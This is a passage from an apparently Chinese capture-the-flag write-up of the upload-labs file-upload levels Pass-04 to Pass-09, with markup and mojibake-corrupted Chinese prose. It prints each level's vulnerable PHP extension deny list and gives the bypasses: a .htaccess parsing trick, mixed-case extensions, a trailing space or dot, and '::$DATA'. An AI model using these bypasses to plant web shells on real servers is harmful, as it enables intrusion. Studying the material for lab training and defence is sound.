aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯éœ€è¦mod_rewrite å¼€å¯ï¼›ä¸”AllowOverride All</p><p>æ­¤æ—¶ä¸Šä¼ çš„ shell.jpg ä¼šè¢«è§£ææˆ php</p><p>ä¸€èˆ¬é»‘åå•éƒ½å¯ä»¥åˆ©ç”¨apacheè§£ææ¼æ´ç»•è¿‡</p><h3 id="Pass-04-htaccessç»•è¿‡"><a href="#Pass-04-htaccessç»•è¿‡" class="headerlink" title="Pass-04 .htaccessç»•è¿‡"></a>Pass-04 .htaccessç»•è¿‡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pHp1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ”¶å°¾å»ç©º</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œä¸Šé¢˜ä¸€æ ·ï¼Œ.htaccessç»•è¿‡</p><h3 id="Pass-05-å¤§å°å†™ç»•è¿‡"><a href="#Pass-05-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-05 å¤§å°å†™ç»•è¿‡"></a>Pass-05 å¤§å°å†™ç»•è¿‡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//é¦–å°¾å»ç©º</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ <code>Php</code>ç»•è¿‡é»‘åå•</p><h3 id="Pass-06-ç©ºæ ¼ç»•è¿‡"><a href="#Pass-06-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-06 ç©ºæ ¼ç»•è¿‡"></a>Pass-06 ç©ºæ ¼ç»•è¿‡</h3><p>åœ¨æ–‡ä»¶åç¼€åä¸ŠåŠ ä¸€ä¸ªç©ºæ ¼å°±è¡Œäº†</p><h3 id="Pass-07-ç‚¹ç»•è¿‡"><a href="#Pass-07-ç‚¹ç»•è¿‡" class="headerlink" title="Pass-07 ç‚¹ç»•è¿‡"></a>Pass-07 ç‚¹ç»•è¿‡</h3><p>ä¸Šä¼ <code>.php.</code>ç»•è¿‡</p><h3 id="Pass-08-DATA-ç»•è¿‡"><a href="#Pass-08-DATA-ç»•è¿‡" class="headerlink" title="Pass-08 ::$DATA ç»•è¿‡"></a>Pass-08 ::$DATA ç»•è¿‡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//é¦–å°¾å»ç©º</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨Windowsçš„ç‰¹æ€§å¦‚æœæ–‡ä»¶å+ ::$DATA ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒ ::$DATA ä¹‹å‰çš„æ–‡ä»¶å ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å,ä¸Šä¼ .php::$DATAç»•è¿‡ã€‚</p><h3 id="Pass-09-ç‚¹-ç©ºæ ¼-ç‚¹-ç»•è¿‡"><a href="#Pass-09-ç‚¹-ç©ºæ ¼-ç‚¹-ç»•è¿‡" class="headerlink" title="Pass-09 ç‚¹ + ç©ºæ ¼ + ç‚¹ ç»•è¿‡"></a>Pass-09 ç‚¹ + ç©ºæ ¼ + ç‚¹ ç»•è¿‡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string 